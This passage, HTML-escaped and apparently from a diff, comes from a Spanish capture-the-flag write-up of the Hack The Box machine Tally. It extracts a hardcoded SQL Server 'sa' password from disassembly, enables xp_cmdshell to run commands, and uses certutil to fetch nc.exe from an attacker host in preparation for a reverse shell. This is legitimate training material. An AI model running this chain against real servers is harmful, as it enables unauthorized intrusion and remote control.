-│   ┌─────&amp;lt; 0x00401208      e9a2010000     jmp 0x4013af      
-│   ││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x401206
-│   │││└──&amp;gt; 0x0040120d      6a00           push 0
-│   │││ ╎   0x0040120f      6a00           push 0
-│   │││ ╎   0x00401211      6800040000     push 0x400                  &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1024
-│   │││ ╎   0x00401216      8d8d7cfbffff   lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_484h]
-│   │││ ╎   0x0040121c      51             push ecx
-│   │││ ╎   0x0040121d      6afd           push 0xfffffffffffffffd
-│   │││ ╎   0x0040121f      6808424200     push str.DRIVERSQL_Server_SERVERTALLY__1433_DATABASEorcharddb_UIDsa_PWDGWE3V656KFH93_4
-GWTG2G_ &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0x424208 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;&quot;&lt;/span&gt;
-│   │││ ╎   0x00401224      6a00           push 0
-│   │││ ╎   0x00401226      8b9574fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│   │││ ╎   0x0040122c      52             push edx
-│   │││ ╎   0x0040122d      e8d27b0000     call sub.ODBC32.dll_SQLDriverConnect
-│   │││ ╎   0x00401232      98             cwde
-│   │││ ╎   0x00401233      89856cfbffff   mov dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_494h], eax
-│   │││ ╎   0x00401239      83bd6cfbffff.  cmp dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_494h], 0xfffffffe
-│   │││┌──&amp;lt; 0x00401240      7c42           jl 0x401284
-│   ││││╎   0x00401242      83bd6cfbffff.  cmp dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_494h], 0
-│  ┌──────&amp;lt; 0x00401249      7c1e           jl 0x401269
-│  │││││╎   0x0040124b      83bd6cfbffff.  cmp dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_494h], 1
-│ ┌───────&amp;lt; 0x00401252      7402           je 0x401256
-│ ────────&amp;lt; 0x00401254      eb2e           jmp 0x401284
-│ ││││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x401252
-│ └───────&amp;gt; 0x00401256      8d8d74fbffff   lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│  │││││╎   0x0040125c      51             push ecx                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_ch
-│  │││││╎   0x0040125d      6a02           push 2                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_8h
-│  │││││╎   0x0040125f      e89cfeffff     call fcn.00401100
-│  │││││╎   0x00401264      83c408         add esp, 8
-│ ┌───────&amp;lt; 0x00401267      eb1b           jmp 0x401284
-│ ││││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x401249
-│ │└──────&amp;gt; 0x00401269      8d9574fbffff   lea edx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│ │ ││││╎   0x0040126f      52             push edx                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_ch
-│ │ ││││╎   0x00401270      6a02           push 2                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_8h
-│ │ ││││╎   0x00401272      e889feffff     call fcn.00401100
-│ │ ││││╎   0x00401277      83c408         add esp, 8
-│ │ ││││╎   0x0040127a      83c8ff         or eax, 0xffffffff          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
-│ │ ││││╎   0x0040127d      66898570fbff.  mov word &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_490h], ax
-│ │ ││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREFS from main @ 0x401240, 0x401254, 0x401267
-│ └────└──&amp;gt; 0x00401284      0fbf8d70fbff.  movsx ecx, word &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_490h]
-│   │││ ╎   0x0040128b      83f9ff         cmp ecx, 0xffffffff
-│   │││┌──&amp;lt; 0x0040128e      7505           jne 0x401295
-│  ┌──────&amp;lt; 0x00401290      e91a010000     jmp 0x4013af
-│  │││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x40128e
-│  ││││└──&amp;gt; 0x00401295      8d9578fbffff   lea edx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│  ││││ ╎   0x0040129b      52             push edx
-│  ││││ ╎   0x0040129c      8b8574fbffff   mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│  ││││ ╎   0x004012a2      50             push eax
-│  ││││ ╎   0x004012a3      6a03           push 3                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 3
-│  ││││ ╎   0x004012a5      e82a7b0000     call sub.ODBC32.dll_SQLAllocHandle
-│  ││││ ╎   0x004012aa      0fbfc8         movsx ecx, ax
-│  ││││ ╎   0x004012ad      85c9           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;ecx, ecx
-│  ││││┌──&amp;lt; 0x004012af      7405           je 0x4012b6
-│ ┌───────&amp;lt; 0x004012b1      e9f9000000     jmp 0x4013af
-│ ││││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF from main @ 0x4012af
-│ │││││└──&amp;gt; 0x004012b6      6afd           push 0xfffffffffffffffd
-│ │││││ ╎   0x004012b8      6868424200     push str.select__from_Orchard_Users_UserPartRecord &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0x424268 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select * from Orchard
-_Users_UserPartRecord&quot;&lt;/span&gt;
-│ │││││ ╎   0x004012bd      8b9578fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ │││││ ╎   0x004012c3      52             push edx
-│ │││││ ╎   0x004012c4      e8177b0000     call sub.ODBC32.dll_SQLExecDirect
-│ │││││ ╎   0x004012c9      98             cwde
-│ │││││ ╎   0x004012ca      85c0           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;eax, eax
-│ │││││┌──&amp;lt; 0x004012cc      741b           je 0x4012e9
-│ ││││││╎   0x004012ce      8d8d78fbffff   lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ ││││││╎   0x004012d4      51             push ecx                    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_ch
-│ ││││││╎   0x004012d5      6a03           push 3                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 3 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int32_t arg_8h
-│ ││││││╎   0x004012d7      e824feffff     call fcn.00401100
-│ ││││││╎   0x004012dc      83c408         add esp, 8
-│ ────────&amp;lt; 0x004012df      e9cb000000     jmp 0x4013af
-..
-│ ││││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREFS from main @ 0x4012cc, 0x4013a2
-│ ─────└──&amp;gt; 0x004012e9      8b9578fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ │││││ ╎   0x004012ef      52             push edx
-│ │││││ ╎   0x004012f0      e8f17a0000     call sub.ODBC32.dll_SQLFetch
-│ │││││ ╎   0x004012f5      98             cwde
-│ │││││ ╎   0x004012f6      85c0           &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;eax, eax
-│ │││││┌──&amp;lt; 0x004012f8      0f85a9000000   jne 0x4013a7
-│ ││││││╎   0x004012fe      6a00           push 0
-│ ││││││╎   0x00401300      6a00           push 0
-│ ││││││╎   0x00401302      8d8d64fbffff   lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_49ch]
-│ ││││││╎   0x00401308      51             push ecx
-│ ││││││╎   0x00401309      6aee           push 0xffffffffffffffee
-│ ││││││╎   0x0040130b      6a01           push 1                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1
-│ ││││││╎   0x0040130d      8b9578fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ ││││││╎   0x00401313      52             push edx
-│ ││││││╎   0x00401314      e8d97a0000     call sub.ODBC32.dll_SQLGetData
-│ ││││││╎   0x00401319      6a00           push 0
-│ ││││││╎   0x0040131b      6a40           push 0x40                   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'@'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 64
-│ ││││││╎   0x0040131d      8d857cffffff   lea eax, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_84h]
-│ ││││││╎   0x00401323      50             push eax
-│ ││││││╎   0x00401324      6a01           push 1                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1
-│ ││││││╎   0x00401326      6a02           push 2                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2
-│ ││││││╎   0x00401328      8b8d78fbffff   mov ecx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ ││││││╎   0x0040132e      51             push ecx
-│ ││││││╎   0x0040132f      e8be7a0000     call sub.ODBC32.dll_SQLGetData
-│ ││││││╎   0x00401334      6a00           push 0
-│ ││││││╎   0x00401336      6a40           push 0x40                   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'@'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 64
-│ ││││││╎   0x00401338      8d55bc         lea edx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_44h]
-│ ││││││╎   0x0040133b      52             push edx
-│ ││││││╎   0x0040133c      6a01           push 1                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1
-│ ││││││╎   0x0040133e      6a03           push 3                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 3
-│ ││││││╎   0x00401340      8b8578fbffff   mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│ ││││││╎   0x00401346      50             push eax
-│ ││││││╎   0x00401347      e8a67a0000     call sub.ODBC32.dll_SQLGetData
-│ ││││││╎   0x0040134c      68501f4000     push fcn.00401f50           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0x401f50 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;U&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ecj&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8bE&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8bU&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03Q&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8
-b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e89H&quot;&lt;/span&gt;
-│ ││││││╎   0x00401351      8d4dbc         lea ecx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_44h]
-│ ││││││╎   0x00401354      51             push ecx
-│ ││││││╎   0x00401355      6894424200     push 0x424294               &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
-│ ││││││╎   0x0040135a      8d957cffffff   lea edx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_84h]
-│ ││││││╎   0x00401360      52             push edx
-│ ││││││╎   0x00401361      6898424200     push 0x424298               &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
-│ ││││││╎   0x00401366      8b8564fbffff   mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_49ch]
-│ ││││││╎   0x0040136c      50             push eax
-│ ││││││╎   0x0040136d      b9a03f4300     mov ecx, 0x433fa0
-│ ││││││╎   0x00401372      e8c91b0000     call fcn.00402f40
-│ ││││││╎   0x00401377      50             push eax
-│ ││││││╎   0x00401378      e803010000     call fcn.00401480
-│ ││││││╎   0x0040137d      83c408         add esp, 8
-│ ││││││╎   0x00401380      50             push eax
-│ ││││││╎   0x00401381      e8fa000000     call fcn.00401480
-│ ││││││╎   0x00401386      83c408         add esp, 8
-│ ││││││╎   0x00401389      50             push eax
-│ ││││││╎   0x0040138a      e8f1000000     call fcn.00401480
-│ ││││││╎   0x0040138f      83c408         add esp, 8
-│ ││││││╎   0x00401392      50             push eax
-│ ││││││╎   0x00401393      e8e8000000     call fcn.00401480
-│ ││││││╎   0x00401398      83c408         add esp, 8
-│ ││││││╎   0x0040139b      8bc8           mov ecx, eax
-│ ││││││╎   0x0040139d      e84e1d0000     call fcn.004030f0
-│ ────────&amp;lt; 0x004013a2      e942ffffff     jmp 0x4012e9
-│ ││││││╎   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREFS from main @ 0x144, 0x4012f8
-│ ─────└──&amp;gt; 0x004013a7      33c9           xor ecx, ecx
-│ │││││ └─&amp;lt; 0x004013a9      0f8504feffff   jne 0x4011b3
-│ │││││     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; XREFS: CODE 0x004011ca  CODE 0x004011e9  CODE 0x00401208  CODE 0x00401290  CODE 0x004012b1  
-│ │││││     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; XREFS: CODE 0x004012df
-│ └└└└└───&amp;gt; 0x004013af      8b9578fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_488h]
-│           0x004013b5      52             push edx
-│           0x004013b6      6a03           push 3                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 3
-│           0x004013b8      e82f7a0000     call sub.ODBC32.dll_SQLFreeHandle
-│           0x004013bd      8b8574fbffff   mov eax, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│           0x004013c3      50             push eax
-│           0x004013c4      e8117a0000     call sub.ODBC32.dll_SQLDisconnect
-│           0x004013c9      8b8d74fbffff   mov ecx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_48ch]
-│           0x004013cf      51             push ecx
-│           0x004013d0      6a02           push 2                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2
-│           0x004013d2      e8157a0000     call sub.ODBC32.dll_SQLFreeHandle
-│           0x004013d7      8b9568fbffff   mov edx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_498h]
-│           0x004013dd      52             push edx
-│           0x004013de      6a01           push 1                      &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 1
-│           0x004013e0      e8077a0000     call sub.ODBC32.dll_SQLFreeHandle
-│           0x004013e5      33c0           xor eax, eax
-│           0x004013e7      8b4dfc         mov ecx, dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;var_4h]
-│           0x004013ea      33cd           xor ecx, ebp
-│           0x004013ec      e8a47c0000     call fcn.00409095
-│           0x004013f1      8be5           mov esp, ebp
-│           0x004013f3      5d             pop ebp
-└           0x004013f4      c3             ret
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x004011a0]&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Poniendo ojo de lince, vemos algo que nos debería de llamar la atención:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para el servicio &lt;strong&gt;&lt;em&gt;Microsoft SQL Server&lt;/em&gt;&lt;/strong&gt;, tenemos el nombre de la base de datos &lt;strong&gt;orcharddb&lt;/strong&gt; y la contraseña &lt;strong&gt;GWE3V65#6KFH93@4GWTG2G&lt;/strong&gt;. Como siempre hay que guardar esta información para no perderla. Lo mismo lo podriamos lograr con los comandos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings tester.exe&lt;/code&gt; y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rabin2 -zqq tester.exe&lt;/code&gt; para ver las cadenas imprimibles del programa.&lt;/p&gt;
-
-&lt;p&gt;Vamos a tratar de conectarnos al servicio SQL con las credenciales que tenemos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ sqsh &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sa'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 10.10.10.59
-sqsh-2.5.16.1 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1995-2001 Scott C. Gray
-Portions Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2004-2014 Michael Peppler and Martin Wesdorp
-This is free software with ABSOLUTELY NO WARRANTY
-For more information &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\warranty'&lt;/span&gt;
-Password: 
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a tratar de ejecutar comados dentro del servidor:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
-2&amp;gt; go
-Msg 15281, Level 16, State 1
-Server &lt;span class=&quot;s1&quot;&gt;'TALLY'&lt;/span&gt;, Procedure &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt;, Line 1
-SQL Server blocked access to procedure &lt;span class=&quot;s1&quot;&gt;'sys.xp_cmdshell'&lt;/span&gt; of component &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt; because this component is turned off as part
-of the security configuration &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this server. A system administrator can &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;the use of &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt; by using sp_configure.
-For more information about enabling &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt;, search &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;SQL Server Books Online.
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos un error que nos manda debido a que el componente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt;está deshabilitado como parte de las configuración de seguridad del servidor, pero no nos preocupamos ya que existe una forma de habilitar el componente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;xp_cmdshell&quot;&lt;/span&gt;,1
-2&amp;gt; go
-Msg 15123, Level 16, State 1
-Server &lt;span class=&quot;s1&quot;&gt;'TALLY'&lt;/span&gt;, Procedure &lt;span class=&quot;s1&quot;&gt;'sp_configure'&lt;/span&gt;, Line 62
-The configuration option &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt; does not exist, or it may be an advanced option.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;status &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al intentar cambiar la configuración con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sp_configure&lt;/code&gt; nos indica que el componente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; no existe. En este punto es necesario habilitar las opciones avanzadas de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sp_configure&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;show advanced options&quot;&lt;/span&gt;, 1
-2&amp;gt; go
-Configuration option &lt;span class=&quot;s1&quot;&gt;'show advanced options'&lt;/span&gt; changed from 0 to 1. Run the RECONFIGURE statement to install.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;status &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1&amp;gt; reconfigure
-2&amp;gt; go
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora si vamos a tratar de habilitar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; sp_configure &lt;span class=&quot;s2&quot;&gt;&quot;xp_cmdshell&quot;&lt;/span&gt;, 1
-2&amp;gt; go
-Configuration option &lt;span class=&quot;s1&quot;&gt;'xp_cmdshell'&lt;/span&gt; changed from 0 to 1. Run the RECONFIGURE statement to install.
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;status &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1&amp;gt; reconfigure
-2&amp;gt; go
-1&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
-2&amp;gt; go
-
-        output                                                                     
-        &lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-        tally&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;arah                                                               
-        NULL                                                                       
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 rows affected, &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;status &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya tenemos ejecución de comando y vemos que estamos como el usuario &lt;strong&gt;sarah&lt;/strong&gt;. Cabe mencionar que es posible que el componente se vuela a deshabilitar, asi que hay que seguir el mismo proceso anterior para habilitarlo. Ahora lo que nos queda es entablarnos una reverse shell, para este caso vamos a transferir el binario nc.exe haciendo uso de un servidor HTTP con python:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; xp_cmdshell &lt;span class=&quot;s2&quot;&gt;&quot;certutil.exe -f -urlcache -split http://10.10.14.27/nc.exe C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe&quot;&lt;/span&gt;                               
-2&amp;gt; go                      
-        output                                                            
-        &lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                                                
-        &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;                 
-          0000  ...
-          6e00                                                                     
-        CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.                       
-        NULL                                                                       
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 rows affected, &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;status &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 12:50:41] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.59 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Nov/2021 12:50:41] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora nos entablamos la conexión:&lt;/p&gt;
-
